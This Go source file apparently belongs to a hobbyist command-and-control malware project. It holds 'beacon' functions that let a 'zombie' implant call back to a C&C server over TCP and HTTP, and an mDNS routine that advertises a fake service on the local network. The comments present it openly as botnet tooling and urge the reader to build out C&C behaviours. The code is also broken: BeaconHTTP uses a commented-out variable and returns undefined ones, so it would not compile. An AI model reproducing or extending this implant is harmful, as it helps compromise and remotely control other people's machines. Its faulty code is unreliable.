/*/
This file contains the code for "beacons"

/*/
package shared_code

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"

	"github.com/hashicorp/mdns"
)

// Beacons
// TODO: "strange" ways of reaching out
// makes requests outside the network to get to the C&C

//used for reaching out with regular TCP connection, this will hand off to regular connection
// if a "good password *HINT*" is provided
// put the id of the entity connecting to let the host know it's us
func BaconTCP(zombie_ID string) {
	PHONEHOME_TCP.IP = net.IP(Remote_tcpaddr)
	connection, derp := net.DialTCP("tcp", &Local_tcpaddr_LAN, &PHONEHOME_TCP)
	if derp != nil {
		// print the error
		Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
		return
	}
	// now we just wait...
	/// zombie should be dialing the home base expecting commands on connect
	// assuming we coded the command and control to reply on connect and not just
	// mark "we got one here" in some internal DB...
	// why dont you try coding some behaviors for the command and control binary
	// to enact on BEACON!
	// TODO: code C&C to pool callbacks into a list
	for {
		netData, derp := bufio.NewReader(connection).ReadString('\n')
		if derp != nil {
			// print the error
			Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
			return
		}
	}
}

// Same for UDP
func BeaconUDP() {
}

// we are going to make different HTTP requests to the Command Server
// even though we are using POST, its not going to carry much data,
// and will only be used as a beacon. the handshake is a specific
// function that needs its own code and placement
func BeaconHTTP(command_url string, request_type string) (*http.Response, error) {
	// if its a get request
	switch request_type {
	case "get":
		http_response, derp := http.Get(command_url)
		if derp != nil {
			Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
			return http_response, derp
		}
		return http_response, derp
	case "post":
		//  POST requests are pushing data to the server
		// they POST data to a source, instead of GETting it!
		// GET it?
		post_body, derp := json.Marshal(BEACONPOSTPAYLOAD)
		if derp != nil {
			Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
		}
		// but this function we are using takes bytes!
		// so you need a line of code like THIS!!
		// to turn text to bytes!
		// post_body_bytes := bytes.NewBuffer(post_body)
		http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
		if derp != nil {
			Error_printer(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
			return http_response, derp

		}
		return http_response, derp
	}
	return http_response, derp

}

/*/
MDNS: https://en.wikipedia.org/wiki/Multicast_DNS
https://tools.ietf.org/html/rfc6762

resolves hostnames to IP addresses within small networks that do not include
a local name server. It is a zero-configuration service, using essentially the
same programming interfaces, packet formats and operating semantics as the unicast
Domain Name System (DNS). Although Stuart Cheshire designed mDNS as a stand-alone
protocol, it can work in concert with standard DNS servers.

An mDNS message is a multicast UDP packet sent using the following addressing:

    IPv4 address 224.0.0.251
	IPv6 address ff02::fb
    UDP port 5353
    When using Ethernet frames, the standard IP multicast MAC address:
		01:00:5E:00:00:FB (for IPv4)
		33:33:00:00:00:FB (for IPv6)
/*/
func MdnsResponder() {
	// Make a channel for results and start listening
	entriesCh := make(chan *mdns.ServiceEntry, 4)
	go func() {
		for entry := range entriesCh {
			fmt.Printf("Got new entry: %v\n", entry)
		}
	}()
	// Start the lookup
	mdns.Lookup("_foobar._tcp", entriesCh)
	close(entriesCh)
}

func StartMdnsReceiver(service_name string, false_service_struct FakeMDNSService) {
	// Setup our service export
	host, _ := os.Hostname()
	info := []string{service_name}
	service, _ := mdns.NewMDNSService(host, "_foobar._tcp", "", "", 8000, nil, info)
	// assign to struct
	fake_mdns_service := FakeMDNSService{}
	fake_mdns_service.host = host
	fake_mdns_service.info = info[0]
	fake_mdns_service.service = *service

	// Create the mDNS server, defer shutdown
	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
	defer server.Shutdown()
}
